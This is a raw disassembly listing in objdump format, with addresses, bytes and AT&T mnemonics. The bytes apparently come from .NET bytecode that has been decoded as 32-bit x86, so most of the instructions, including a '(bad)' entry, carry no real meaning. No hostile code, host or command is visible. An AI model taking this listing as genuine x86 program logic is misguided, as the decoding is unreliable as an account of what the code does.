  403a55:	00 00                	add    %al,(%eax)
  403a57:	0a 69 8c             	or     -0x74(%ecx),%ch
  403a5a:	5f                   	pop    %edi
  403a5b:	00 00                	add    %al,(%eax)
  403a5d:	01 12                	add    %edx,(%edx)
  403a5f:	09 28                	or     %ebp,(%eax)
  403a61:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a62:	00 00                	add    %al,(%eax)
  403a64:	0a 8c 5f 00 00 01 12 	or     0x12010000(%edi,%ebx,2),%cl
  403a6b:	09 28                	or     %ebp,(%eax)
  403a6d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a6e:	00 00                	add    %al,(%eax)
  403a70:	0a 8c 5f 00 00 01 28 	or     0x28010000(%edi,%ebx,2),%cl
  403a77:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a78:	00 00                	add    %al,(%eax)
  403a7a:	0a 28                	or     (%eax),%ch
  403a7c:	a8 00                	test   $0x0,%al
  403a7e:	00 0a                	add    %cl,(%edx)
  403a80:	6f                   	outsl  %ds:(%esi),(%dx)
  403a81:	32 00                	xor    (%eax),%al
  403a83:	00 0a                	add    %cl,(%edx)
  403a85:	2b 1b                	sub    (%ebx),%ebx
  403a87:	02 7b 2e             	add    0x2e(%ebx),%bh
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	04 06                	add    $0x6,%al
  403a8e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a8f:	85 00                	test   %eax,(%eax)
  403a91:	00 0a                	add    %cl,(%edx)
  403a93:	7b 32                	jnp    0x403ac7
  403a95:	00 00                	add    %al,(%eax)
  403a97:	04 72                	add    $0x72,%al
  403a99:	01 00                	add    %eax,(%eax)
  403a9b:	00 70 6f             	add    %dh,0x6f(%eax)
  403a9e:	32 00                	xor    (%eax),%al
  403aa0:	00 0a                	add    %cl,(%edx)
  403aa2:	03 6f a9             	add    -0x57(%edi),%ebp
  403aa5:	00 00                	add    %al,(%eax)
  403aa7:	0a 28                	or     (%eax),%ch
  403aa9:	0f 00 00             	sldt   (%eax)
  403aac:	0a 2d 1e 02 7b 2e    	or     0x2e7b021e,%ch
  403ab2:	00 00                	add    %al,(%eax)
  403ab4:	04 06                	add    $0x6,%al
  403ab6:	6f                   	outsl  %ds:(%esi),(%dx)
  403ab7:	85 00                	test   %eax,(%eax)
  403ab9:	00 0a                	add    %cl,(%edx)
  403abb:	7b 33                	jnp    0x403af0
  403abd:	00 00                	add    %al,(%eax)
  403abf:	04 03                	add    $0x3,%al
  403ac1:	6f                   	outsl  %ds:(%esi),(%dx)
  403ac2:	a9 00 00 0a 6f       	test   $0x6f0a0000,%eax
  403ac7:	32 00                	xor    (%eax),%al
  403ac9:	00 0a                	add    %cl,(%edx)
  403acb:	2b 1b                	sub    (%ebx),%ebx
  403acd:	02 7b 2e             	add    0x2e(%ebx),%bh
  403ad0:	00 00                	add    %al,(%eax)
  403ad2:	04 06                	add    $0x6,%al
  403ad4:	6f                   	outsl  %ds:(%esi),(%dx)
  403ad5:	85 00                	test   %eax,(%eax)
  403ad7:	00 0a                	add    %cl,(%edx)
  403ad9:	7b 33                	jnp    0x403b0e
  403adb:	00 00                	add    %al,(%eax)
  403add:	04 72                	add    $0x72,%al
  403adf:	01 00                	add    %eax,(%eax)
  403ae1:	00 70 6f             	add    %dh,0x6f(%eax)
  403ae4:	32 00                	xor    (%eax),%al
  403ae6:	00 0a                	add    %cl,(%edx)
  403ae8:	28 aa 00 00 0a 2a    	sub    %ch,0x2a0a0000(%edx)
  403aee:	00 00                	add    %al,(%eax)
  403af0:	13 30                	adc    (%eax),%esi
  403af2:	02 00                	add    (%eax),%al
  403af4:	1a 00                	sbb    (%eax),%al
  403af6:	00 00                	add    %al,(%eax)
  403af8:	0b 00                	or     (%eax),%eax
  403afa:	00 11                	add    %dl,(%ecx)
  403afc:	1f                   	pop    %ds
  403afd:	f6 28                	imulb  (%eax)
  403aff:	34 00                	xor    $0x0,%al
  403b01:	00 06                	add    %al,(%esi)
  403b03:	0a 06                	or     (%esi),%al
  403b05:	28 35 00 00 06 0b    	sub    %dh,0xb060000
  403b0b:	07                   	pop    %es
  403b0c:	18 2e                	sbb    %ch,(%esi)
  403b0e:	03 07                	add    (%edi),%eax
  403b10:	2d 02 16 2a 17       	sub    $0x172a1602,%eax
  403b15:	2a 00                	sub    (%eax),%al
  403b17:	00 13                	add    %dl,(%ebx)
  403b19:	30 02                	xor    %al,(%edx)
  403b1b:	00 1a                	add    %bl,(%edx)
  403b1d:	00 00                	add    %al,(%eax)
  403b1f:	00 0b                	add    %cl,(%ebx)
  403b21:	00 00                	add    %al,(%eax)
  403b23:	11 1f                	adc    %ebx,(%edi)
  403b25:	f5                   	cmc
  403b26:	28 34 00             	sub    %dh,(%eax,%eax,1)
  403b29:	00 06                	add    %al,(%esi)
  403b2b:	0a 06                	or     (%esi),%al
  403b2d:	28 35 00 00 06 0b    	sub    %dh,0xb060000
  403b33:	07                   	pop    %es
  403b34:	18 2e                	sbb    %ch,(%esi)
  403b36:	03 07                	add    (%edi),%eax
  403b38:	2d 02 16 2a 17       	sub    $0x172a1602,%eax
  403b3d:	2a 00                	sub    (%eax),%al
  403b3f:	00 13                	add    %dl,(%ebx)
  403b41:	30 02                	xor    %al,(%edx)
  403b43:	00 1a                	add    %bl,(%edx)
  403b45:	00 00                	add    %al,(%eax)
  403b47:	00 0b                	add    %cl,(%ebx)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	11 1f                	adc    %ebx,(%edi)
  403b4d:	f4                   	hlt
  403b4e:	28 34 00             	sub    %dh,(%eax,%eax,1)
  403b51:	00 06                	add    %al,(%esi)
  403b53:	0a 06                	or     (%esi),%al
  403b55:	28 35 00 00 06 0b    	sub    %dh,0xb060000
  403b5b:	07                   	pop    %es
  403b5c:	18 2e                	sbb    %ch,(%esi)
  403b5e:	03 07                	add    (%edi),%eax
  403b60:	2d 02 16 2a 17       	sub    $0x172a1602,%eax
  403b65:	2a 1e                	sub    (%esi),%bl
  403b67:	02 28                	add    (%eax),%ch
  403b69:	13 00                	adc    (%eax),%eax
  403b6b:	00 0a                	add    %cl,(%edx)
  403b6d:	2a 00                	sub    (%eax),%al
  403b6f:	00 03                	add    %al,(%ebx)
  403b71:	30 02                	xor    %al,(%edx)
  403b73:	00 40 00             	add    %al,0x0(%eax)
  403b76:	00 00                	add    %al,(%eax)
  403b78:	00 00                	add    %al,(%eax)
  403b7a:	00 00                	add    %al,(%eax)
  403b7c:	02 1f                	add    (%edi),%bl
  403b7e:	0c 7d                	or     $0x7d,%al
  403b80:	42                   	inc    %edx
  403b81:	00 00                	add    %al,(%eax)
  403b83:	04 02                	add    $0x2,%al
  403b85:	1f                   	pop    %ds
  403b86:	0e                   	push   %cs
  403b87:	7d 44                	jge    0x403bcd
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	04 02                	add    $0x2,%al
  403b8d:	1f                   	pop    %ds
  403b8e:	0e                   	push   %cs
  403b8f:	7d 46                	jge    0x403bd7
  403b91:	00 00                	add    %al,(%eax)
  403b93:	04 02                	add    $0x2,%al
  403b95:	1f                   	pop    %ds
  403b96:	0e                   	push   %cs
  403b97:	7d 48                	jge    0x403be1
  403b99:	00 00                	add    %al,(%eax)
  403b9b:	04 02                	add    $0x2,%al
  403b9d:	19 7d 4a             	sbb    %edi,0x4a(%ebp)
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	04 02                	add    $0x2,%al
  403ba4:	19 7d 4b             	sbb    %edi,0x4b(%ebp)
  403ba7:	00 00                	add    %al,(%eax)
  403ba9:	04 02                	add    $0x2,%al
  403bab:	28 ab 00 00 0a 02    	sub    %ch,0x20a0000(%ebx)
  403bb1:	73 1e                	jae    0x403bd1
  403bb3:	00 00                	add    %al,(%eax)
  403bb5:	06                   	push   %es
  403bb6:	7d 41                	jge    0x403bf9
  403bb8:	00 00                	add    %al,(%eax)
  403bba:	04 2a                	add    $0x2a,%al
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	08 00                	or     %al,(%eax)
  403bc0:	44                   	inc    %esp
  403bc1:	03 00                	add    (%eax),%eax
  403bc3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403bc6:	00 11                	add    %dl,(%ecx)
  403bc8:	03 28                	add    (%eax),%ebp
  403bca:	0f 00 00             	sldt   (%eax)
  403bcd:	0a 2c 08             	or     (%eax,%ecx,1),%ch
  403bd0:	04 28                	add    $0x28,%al
  403bd2:	0f 00 00             	sldt   (%eax)
  403bd5:	0a 2d 2d 28 29 00    	or     0x29282d,%ch
  403bdb:	00 0a                	add    %cl,(%edx)
  403bdd:	6f                   	outsl  %ds:(%esi),(%dx)
  403bde:	2a 00                	sub    (%eax),%al
  403be0:	00 0a                	add    %cl,(%edx)
  403be2:	0a 72 01             	or     0x1(%edx),%dh
  403be5:	00 00                	add    %al,(%eax)
  403be7:	70 0b                	jo     0x403bf4
  403be9:	03 28                	add    (%eax),%ebp
  403beb:	0f 00 00             	sldt   (%eax)
  403bee:	0a 2d 02 03 0a 04    	or     0x40a0302,%ch
  403bf4:	28 0f                	sub    %cl,(%edi)
  403bf6:	00 00                	add    %al,(%eax)
  403bf8:	0a 2d 02 04 0b 07    	or     0x70b0402,%ch
  403bfe:	06                   	push   %es
  403bff:	28 ac 00 00 0a 26 02 	sub    %ch,0x2260a00(%eax,%eax,1)
  403c06:	72 01                	jb     0x403c09
  403c08:	00 00                	add    %al,(%eax)
  403c0a:	70 7d                	jo     0x403c89
  403c0c:	4c                   	dec    %esp
  403c0d:	00 00                	add    %al,(%eax)
  403c0f:	04 02                	add    $0x2,%al
  403c11:	72 01                	jb     0x403c14
  403c13:	00 00                	add    %al,(%eax)
  403c15:	70 7d                	jo     0x403c94
  403c17:	4d                   	dec    %ebp
  403c18:	00 00                	add    %al,(%eax)
  403c1a:	04 73                	add    $0x73,%al
  403c1c:	ad                   	lods   %ds:(%esi),%eax
  403c1d:	00 00                	add    %al,(%eax)
  403c1f:	0a 0c 05 6f ae 00 00 	or     0xae6f(,%eax,1),%cl
  403c26:	0a 13                	or     (%ebx),%dl
  403c28:	13 38                	adc    (%eax),%edi
  403c2a:	ac                   	lods   %ds:(%esi),%al
  403c2b:	02 00                	add    (%eax),%al
  403c2d:	00 11                	add    %dl,(%ecx)
  403c2f:	13 6f af             	adc    -0x51(%edi),%ebp
  403c32:	00 00                	add    %al,(%eax)
  403c34:	0a 0d 14 13 04 09    	or     0x9041314,%cl
  403c3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403c3b:	b0 00                	mov    $0x0,%al
  403c3d:	00 0a                	add    %cl,(%edx)
  403c3f:	28 0f                	sub    %cl,(%edi)
  403c41:	00 00                	add    %al,(%eax)
  403c43:	0a 2c 0e             	or     (%esi,%ecx,1),%ch
  403c46:	d0 35 00 00 01 28    	shlb   $1,0x28010000
  403c4c:	b1 00                	mov    $0x0,%cl
  403c4e:	00 0a                	add    %cl,(%edx)
  403c50:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  403c53:	0d 09 6f b0 00       	or     $0xb06f09,%eax
  403c58:	00 0a                	add    %cl,(%edx)
  403c5a:	28 b2 00 00 0a 13    	sub    %dh,0x130a0000(%edx)
  403c60:	04 11                	add    $0x11,%al
  403c62:	04 6f                	add    $0x6f,%al
  403c64:	b3 00                	mov    $0x0,%bl
  403c66:	00 0a                	add    %cl,(%edx)
  403c68:	39 1c 01             	cmp    %ebx,(%ecx,%eax,1)
  403c6b:	00 00                	add    %al,(%eax)
  403c6d:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  403c70:	b4 00                	mov    $0x0,%ah
  403c72:	00 0a                	add    %cl,(%edx)
  403c74:	13 05 72 53 01 00    	adc    0x15372,%eax
  403c7a:	70 1f                	jo     0x403c9b
  403c7c:	60                   	pusha
  403c7d:	13 14 12             	adc    (%edx,%edx,1),%edx
  403c80:	14 28                	adc    $0x28,%al
  403c82:	b5 00                	mov    $0x0,%ch
  403c84:	00 0a                	add    %cl,(%edx)
  403c86:	72 93                	jb     0x403c1b
  403c88:	01 00                	add    %eax,(%eax)
  403c8a:	70 28                	jo     0x403cb4
  403c8c:	b6 00                	mov    $0x0,%dh
  403c8e:	00 0a                	add    %cl,(%edx)
  403c90:	28 b2 00 00 0a 13    	sub    %dh,0x130a0000(%edx)
  403c96:	06                   	push   %es
  403c97:	11 06                	adc    %eax,(%esi)
  403c99:	17                   	pop    %ss
  403c9a:	8d 62 00             	lea    0x0(%edx),%esp
  403c9d:	00 01                	add    %al,(%ecx)
  403c9f:	13 15 11 15 16 11    	adc    0x11161511,%edx
  403ca5:	05 a2 11 15 6f       	add    $0x6f1511a2,%eax
  403caa:	b7 00                	mov    $0x0,%bh
  403cac:	00 0a                	add    %cl,(%edx)
  403cae:	13 06                	adc    (%esi),%eax
  403cb0:	11 06                	adc    %eax,(%esi)
  403cb2:	20 14 02             	and    %dl,(%edx,%eax,1)
  403cb5:	00 00                	add    %al,(%eax)
  403cb7:	14 7e                	adc    $0x7e,%al
  403cb9:	b8 00 00 0a 14       	mov    $0x140a0000,%eax
  403cbe:	6f                   	outsl  %ds:(%esi),(%dx)
  403cbf:	b9 00 00 0a 13       	mov    $0x130a0000,%ecx
  403cc4:	07                   	pop    %es
  403cc5:	11 07                	adc    %eax,(%edi)
  403cc7:	14 6f                	adc    $0x6f,%al
  403cc9:	ba 00 00 0a 13       	mov    $0x130a0000,%edx
  403cce:	08 16                	or     %dl,(%esi)
  403cd0:	13 09                	adc    (%ecx),%ecx
  403cd2:	72 01                	jb     0x403cd5
  403cd4:	00 00                	add    %al,(%eax)
  403cd6:	70 13                	jo     0x403ceb
  403cd8:	0a 09                	or     (%ecx),%cl
  403cda:	6f                   	outsl  %ds:(%esi),(%dx)
  403cdb:	bb 00 00 0a 28       	mov    $0x280a0000,%ebx
  403ce0:	0f 00 00             	sldt   (%eax)
  403ce3:	0a 2d 1d 02 72 97    	or     0x9772021d,%ch
  403ce9:	01 00                	add    %eax,(%eax)
  403ceb:	70 09                	jo     0x403cf6
  403ced:	6f                   	outsl  %ds:(%esi),(%dx)
  403cee:	bb 00 00 0a 11       	mov    $0x110a0000,%ebx
  403cf3:	09 8c 5f 00 00 01 28 	or     %ecx,0x28010000(%edi,%ebx,2)
  403cfa:	bc 00 00 0a 7d       	mov    $0x7d0a0000,%esp
  403cff:	4d                   	dec    %ebp
  403d00:	00 00                	add    %al,(%eax)
  403d02:	04 02                	add    $0x2,%al
  403d04:	6f                   	outsl  %ds:(%esi),(%dx)
  403d05:	bd 00 00 0a 13       	mov    $0x130a0000,%ebp
  403d0a:	0a 11                	or     (%ecx),%dl
  403d0c:	0a 28                	or     (%eax),%ch
  403d0e:	0f 00 00             	sldt   (%eax)
  403d11:	0a 2c 02             	or     (%edx,%eax,1),%ch
  403d14:	de 3f                	fidivrs (%edi)
  403d16:	11 0a                	adc    %ecx,(%edx)
  403d18:	11 05 28 be 00 00    	adc    %eax,0xbe28
  403d1e:	0a 13                	or     (%ebx),%dl
  403d20:	0b 11                	or     (%ecx),%edx
  403d22:	06                   	push   %es
  403d23:	72 ad                	jb     0x403cd2
  403d25:	01 00                	add    %eax,(%eax)
  403d27:	70 20                	jo     0x403d49
  403d29:	14 01                	adc    $0x1,%al
  403d2b:	00 00                	add    %al,(%eax)
  403d2d:	14 11                	adc    $0x11,%al
  403d2f:	08 17                	or     %dl,(%edi)
  403d31:	8d 01                	lea    (%ecx),%eax
  403d33:	00 00                	add    %al,(%eax)
  403d35:	01 13                	add    %edx,(%ebx)
  403d37:	16                   	push   %ss
  403d38:	11 16                	adc    %edx,(%esi)
  403d3a:	16                   	push   %ss
  403d3b:	11 0b                	adc    %ecx,(%ebx)
  403d3d:	a2 11 16 6f bf       	mov    %al,0xbf6f1611
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 26                	or     (%esi),%ah
  403d46:	de 05 13 0c 11 0c    	fiadds 0xc110c13
  403d4c:	7a 11                	jp     0x403d5f
  403d4e:	09 17                	or     %edx,(%edi)
  403d50:	58                   	pop    %eax
  403d51:	13 09                	adc    (%ecx),%ecx
  403d53:	2b 84 11 06 72 b5 01 	sub    0x1b57206(%ecx,%edx,1),%eax
  403d5a:	00 70 20             	add    %dh,0x20(%eax)
  403d5d:	14 01                	adc    $0x1,%al
  403d5f:	00 00                	add    %al,(%eax)
  403d61:	14 11                	adc    $0x11,%al
  403d63:	08 14 6f             	or     %dl,(%edi,%ebp,2)
  403d66:	bf 00 00 0a 74       	mov    $0x740a0000,%edi
  403d6b:	6a 00                	push   $0x0
  403d6d:	00 01                	add    %al,(%ecx)
  403d6f:	13 0d 08 09 6f bb    	adc    0xbb6f0908,%ecx
  403d75:	00 00                	add    %al,(%eax)
  403d77:	0a 11                	or     (%ecx),%dl
  403d79:	0d 73 c0 00 00       	or     $0xc073,%eax
  403d7e:	0a 6f c1             	or     -0x3f(%edi),%ch
  403d81:	00 00                	add    %al,(%eax)
  403d83:	0a 38                	or     (%eax),%bh
  403d85:	51                   	push   %ecx
  403d86:	01 00                	add    %eax,(%eax)
  403d88:	00 14 13             	add    %dl,(%ebx,%edx,1)
  403d8b:	0e                   	push   %cs
  403d8c:	14 13                	adc    $0x13,%al
  403d8e:	0f 11 04 d0          	movups %xmm0,(%eax,%edx,8)
  403d92:	22 00                	and    (%eax),%al
  403d94:	00 01                	add    %al,(%ecx)
  403d96:	28 b1 00 00 0a 28    	sub    %dh,0x280a0000(%ecx)
  403d9c:	c2 00 00             	ret    $0x0
  403d9f:	0a 39                	or     (%ecx),%bh
  403da1:	e9 00 00 00 11       	jmp    0x11403da6
  403da6:	04 d0                	add    $0xd0,%al
  403da8:	21 00                	and    %eax,(%eax)
  403daa:	00 01                	add    %al,(%ecx)
  403dac:	28 b1 00 00 0a 28    	sub    %dh,0x280a0000(%ecx)
  403db2:	c2 00 00             	ret    $0x0
  403db5:	0a 39                	or     (%ecx),%bh
  403db7:	b1 00                	mov    $0x0,%cl
  403db9:	00 00                	add    %al,(%eax)
  403dbb:	09 6f bb             	or     %ebp,-0x45(%edi)
  403dbe:	00 00                	add    %al,(%eax)
  403dc0:	0a 28                	or     (%eax),%ch
  403dc2:	0f 00 00             	sldt   (%eax)
  403dc5:	0a 2d 16 02 72 c5    	or     0xc5720216,%ch
  403dcb:	01 00                	add    %eax,(%eax)
  403dcd:	70 09                	jo     0x403dd8
  403dcf:	6f                   	outsl  %ds:(%esi),(%dx)
  403dd0:	bb 00 00 0a 28       	mov    $0x280a0000,%ebx
  403dd5:	c3                   	ret
  403dd6:	00 00                	add    %al,(%eax)
  403dd8:	0a 7d 4d             	or     0x4d(%ebp),%bh
  403ddb:	00 00                	add    %al,(%eax)
  403ddd:	04 09                	add    $0x9,%al
  403ddf:	6f                   	outsl  %ds:(%esi),(%dx)
  403de0:	c4 00                	les    (%eax),%eax
  403de2:	00 0a                	add    %cl,(%edx)
  403de4:	28 0f                	sub    %cl,(%edi)
  403de6:	00 00                	add    %al,(%eax)
  403de8:	0a 2d 16 02 25 7b    	or     0x7b250216,%ch
  403dee:	4d                   	dec    %ebp
  403def:	00 00                	add    %al,(%eax)
  403df1:	04 72                	add    $0x72,%al
  403df3:	d1 01                	roll   $1,(%ecx)
  403df5:	00 70 28             	add    %dh,0x28(%eax)
  403df8:	a8 00                	test   $0x0,%al
  403dfa:	00 0a                	add    %cl,(%edx)
  403dfc:	7d 4d                	jge    0x403e4b
  403dfe:	00 00                	add    %al,(%eax)
  403e00:	04 02                	add    $0x2,%al
  403e02:	6f                   	outsl  %ds:(%esi),(%dx)
  403e03:	bd 00 00 0a 13       	mov    $0x130a0000,%ebp
  403e08:	0f 11 0f             	movups %xmm1,(%edi)
  403e0b:	72 fb                	jb     0x403e08
  403e0d:	01 00                	add    %eax,(%eax)
  403e0f:	70 28                	jo     0x403e39
  403e11:	c5 00                	lds    (%eax),%eax
  403e13:	00 0a                	add    %cl,(%edx)
  403e15:	2c 0e                	sub    $0xe,%al
  403e17:	02 09                	add    (%ecx),%cl
  403e19:	6f                   	outsl  %ds:(%esi),(%dx)
  403e1a:	c4 00                	les    (%eax),%eax
  403e1c:	00 0a                	add    %cl,(%edx)
  403e1e:	6f                   	outsl  %ds:(%esi),(%dx)
  403e1f:	c6 00 00             	movb   $0x0,(%eax)
  403e22:	0a 2b                	or     (%ebx),%ch
  403e24:	37                   	aaa
  403e25:	11 0f                	adc    %ecx,(%edi)
  403e27:	28 0f                	sub    %cl,(%edi)
  403e29:	00 00                	add    %al,(%eax)
  403e2b:	0a 2c 08             	or     (%eax,%ecx,1),%ch
  403e2e:	09 6f c7             	or     %ebp,-0x39(%edi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	0a 13                	or     (%ebx),%dl
  403e35:	0e                   	push   %cs
  403e36:	11 0e                	adc    %ecx,(%esi)
  403e38:	2d 22 11 0f 11       	sub    $0x110f1122,%eax
  403e3d:	04 28                	add    $0x28,%al
  403e3f:	be 00 00 0a 13       	mov    $0x130a0000,%esi
  403e44:	0e                   	push   %cs
  403e45:	de 15 26 02 72 01    	ficoms 0x1720226
  403e4b:	02 00                	add    (%eax),%al
  403e4d:	70 6f                	jo     0x403ebe
  403e4f:	c8 00 00 0a          	enter  $0x0,$0xa
  403e53:	72 fb                	jb     0x403e50
  403e55:	01 00                	add    %eax,(%eax)
  403e57:	70 13                	jo     0x403e6c
  403e59:	0f de 00             	pmaxub (%eax),%mm0
  403e5c:	11 0f                	adc    %ecx,(%edi)
  403e5e:	72 fb                	jb     0x403e5b
  403e60:	01 00                	add    %eax,(%eax)
  403e62:	70 28                	jo     0x403e8c
  403e64:	c5 00                	lds    (%eax),%eax
  403e66:	00 0a                	add    %cl,(%edx)
  403e68:	2d 97 2b 54 02       	sub    $0x2542b97,%eax
  403e6d:	72 01                	jb     0x403e70
  403e6f:	00 00                	add    %al,(%eax)
  403e71:	70 72                	jo     0x403ee5
  403e73:	01 00                	add    %eax,(%eax)
  403e75:	00 70 72             	add    %dh,0x72(%eax)
  403e78:	01 00                	add    %eax,(%eax)
  403e7a:	00 70 72             	add    %dh,0x72(%eax)
  403e7d:	01 00                	add    %eax,(%eax)
  403e7f:	00 70 6f             	add    %dh,0x6f(%eax)
  403e82:	c9                   	leave
  403e83:	00 00                	add    %al,(%eax)
  403e85:	0a 13                	or     (%ebx),%dl
  403e87:	10 11                	adc    %dl,(%ecx)
  403e89:	10 13                	adc    %dl,(%ebx)
  403e8b:	0e                   	push   %cs
  403e8c:	2b 32                	sub    (%edx),%esi
  403e8e:	09 6f bb             	or     %ebp,-0x45(%edi)
  403e91:	00 00                	add    %al,(%eax)
  403e93:	0a 28                	or     (%eax),%ch
  403e95:	0f 00 00             	sldt   (%eax)
  403e98:	0a 2d 16 02 72 c5    	or     0xc5720216,%ch
  403e9e:	01 00                	add    %eax,(%eax)
  403ea0:	70 09                	jo     0x403eab
  403ea2:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea3:	bb 00 00 0a 28       	mov    $0x280a0000,%ebx
  403ea8:	c3                   	ret
  403ea9:	00 00                	add    %al,(%eax)
  403eab:	0a 7d 4d             	or     0x4d(%ebp),%bh
  403eae:	00 00                	add    %al,(%eax)
  403eb0:	04 14                	add    $0x14,%al
  403eb2:	13 11                	adc    (%ecx),%edx
  403eb4:	02 6f ca             	add    -0x36(%edi),%ch
  403eb7:	00 00                	add    %al,(%eax)
  403eb9:	0a 13                	or     (%ebx),%dl
  403ebb:	11 11                	adc    %edx,(%ecx)
  403ebd:	11 13                	adc    %edx,(%ebx)
  403ebf:	0e                   	push   %cs
  403ec0:	08 09                	or     %cl,(%ecx)
  403ec2:	6f                   	outsl  %ds:(%esi),(%dx)
  403ec3:	bb 00 00 0a 11       	mov    $0x110a0000,%ebx
  403ec8:	0e                   	push   %cs
  403ec9:	73 c0                	jae    0x403e8b
  403ecb:	00 00                	add    %al,(%eax)
  403ecd:	0a 6f c1             	or     -0x3f(%edi),%ch
  403ed0:	00 00                	add    %al,(%eax)
  403ed2:	0a de                	or     %dh,%bl
  403ed4:	05 13 12 11 12       	add    $0x12111213,%eax
  403ed9:	7a 11                	jp     0x403eec
  403edb:	13 6f 5f             	adc    0x5f(%edi),%ebp
  403ede:	00 00                	add    %al,(%eax)
  403ee0:	0a 3a                	or     (%edx),%bh
  403ee2:	48                   	dec    %eax
  403ee3:	fd                   	std
  403ee4:	ff                   	(bad)
  403ee5:	ff                   	lcall  (bad)
  403ee6:	de 0c 11             	fimuls (%ecx,%edx,1)
  403ee9:	13 2c 07             	adc    (%edi,%eax,1),%ebp
  403eec:	11 13                	adc    %edx,(%ebx)
  403eee:	6f                   	outsl  %ds:(%esi),(%dx)
  403eef:	60                   	pusha
  403ef0:	00 00                	add    %al,(%eax)
  403ef2:	0a dc                	or     %ah,%bl
  403ef4:	02 72 01             	add    0x1(%edx),%dh
  403ef7:	00 00                	add    %al,(%eax)
  403ef9:	70 7d                	jo     0x403f78
  403efb:	4c                   	dec    %esp
  403efc:	00 00                	add    %al,(%eax)
  403efe:	04 02                	add    $0x2,%al
  403f00:	72 01                	jb     0x403f03
  403f02:	00 00                	add    %al,(%eax)
  403f04:	70 7d                	jo     0x403f83
  403f06:	4d                   	dec    %ebp
  403f07:	00 00                	add    %al,(%eax)
  403f09:	04 08                	add    $0x8,%al
  403f0b:	2a 41 64             	sub    0x64(%ecx),%al
  403f0e:	00 00                	add    %al,(%eax)
  403f10:	00 00                	add    %al,(%eax)
  403f12:	00 00                	add    %al,(%eax)
  403f14:	11 01                	adc    %eax,(%ecx)
  403f16:	00 00                	add    %al,(%eax)
  403f18:	6f                   	outsl  %ds:(%esi),(%dx)
  403f19:	00 00                	add    %al,(%eax)
  403f1b:	00 80 01 00 00 05    	add    %al,0x5000001(%eax)
  403f21:	00 00                	add    %al,(%eax)
  403f23:	00 6b 00             	add    %ch,0x0(%ebx)
  403f26:	00 01                	add    %al,(%ecx)
  403f28:	00 00                	add    %al,(%eax)
  403f2a:	00 00                	add    %al,(%eax)
  403f2c:	72 02                	jb     0x403f30
  403f2e:	00 00                	add    %al,(%eax)
  403f30:	0d 00 00 00 7f       	or     $0x7f000000,%eax
  403f35:	02 00                	add    (%eax),%al
  403f37:	00 15 00 00 00 01    	add    %dl,0x1000000
  403f3d:	00 00                	add    %al,(%eax)
  403f3f:	01 00                	add    %eax,(%eax)
  403f41:	00 00                	add    %al,(%eax)
  403f43:	00 c7                	add    %al,%bh
  403f45:	01 00                	add    %eax,(%eax)
  403f47:	00 46 01             	add    %al,0x1(%esi)
  403f4a:	00 00                	add    %al,(%eax)
  403f4c:	0d 03 00 00 05       	or     $0x5000003,%eax
  403f51:	00 00                	add    %al,(%eax)
  403f53:	00 6b 00             	add    %ch,0x0(%ebx)
  403f56:	00 01                	add    %al,(%ecx)
  403f58:	02 00                	add    (%eax),%al
  403f5a:	00 00                	add    %al,(%eax)
  403f5c:	61                   	popa
  403f5d:	00 00                	add    %al,(%eax)
  403f5f:	00 bf 02 00 00 20    	add    %bh,0x20000002(%edi)
  403f65:	03 00                	add    (%eax),%eax
  403f67:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403f6a:	00 00                	add    %al,(%eax)
  403f6c:	00 00                	add    %al,(%eax)
  403f6e:	00 00                	add    %al,(%eax)
  403f70:	13 30                	adc    (%eax),%esi
  403f72:	04 00                	add    $0x0,%al
  403f74:	14 00                	adc    $0x0,%al
  403f76:	00 00                	add    %al,(%eax)
  403f78:	0d 00 00 11 05       	or     $0x5110000,%eax
  403f7d:	0e                   	push   %cs
  403f7e:	04 03                	add    $0x3,%al
  403f80:	04 28                	add    $0x28,%al
  403f82:	23 00                	and    (%eax),%eax
  403f84:	00 06                	add    %al,(%esi)
  403f86:	0a 06                	or     (%esi),%al
  403f88:	15 33 03 0e 04       	adc    $0x40e0333,%eax
  403f8d:	0a 06                	or     (%esi),%al
  403f8f:	2a 13                	sub    (%ebx),%dl
  403f91:	30 06                	xor    %al,(%esi)
  403f93:	00 51 00             	add    %dl,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	0e                   	push   %cs
  403f99:	00 00                	add    %al,(%eax)
  403f9b:	11 03                	adc    %eax,(%ebx)
  403f9d:	04 0e                	add    $0xe,%al
  403f9f:	04 05                	add    $0x5,%al
  403fa1:	0e                   	push   %cs
  403fa2:	05 0e 06 28 02       	add    $0x228060e,%eax
  403fa7:	00 00                	add    %al,(%eax)
  403fa9:	06                   	push   %es
  403faa:	0a 06                	or     (%esi),%al
  403fac:	2c 3d                	sub    $0x3d,%al
  403fae:	73 cb                	jae    0x403f7b
  403fb0:	00 00                	add    %al,(%eax)
  403fb2:	0a 0b                	or     (%ebx),%cl
  403fb4:	06                   	push   %es
  403fb5:	7b 22                	jnp    0x403fd9
  403fb7:	00 00                	add    %al,(%eax)
  403fb9:	04 6f                	add    $0x6f,%al
  403fbb:	cc                   	int3
  403fbc:	00 00                	add    %al,(%eax)
  403fbe:	0a 0d 16 13 04 2b    	or     0x2b041316,%cl
  403fc4:	12 09                	adc    (%ecx),%cl
  403fc6:	11 04 93             	adc    %eax,(%ebx,%edx,4)
  403fc9:	0c 07                	or     $0x7,%al
  403fcb:	08 6f cd             	or     %ch,-0x33(%edi)
  403fce:	00 00                	add    %al,(%eax)
  403fd0:	0a 11                	or     (%ecx),%dl
  403fd2:	04 17                	add    $0x17,%al
  403fd4:	58                   	pop    %eax
  403fd5:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403fd8:	04 09                	add    $0x9,%al
  403fda:	8e 69 32             	mov    0x32(%ecx),%gs
  403fdd:	e7 06                	out    %eax,$0x6
  403fdf:	7b 21                	jnp    0x404002
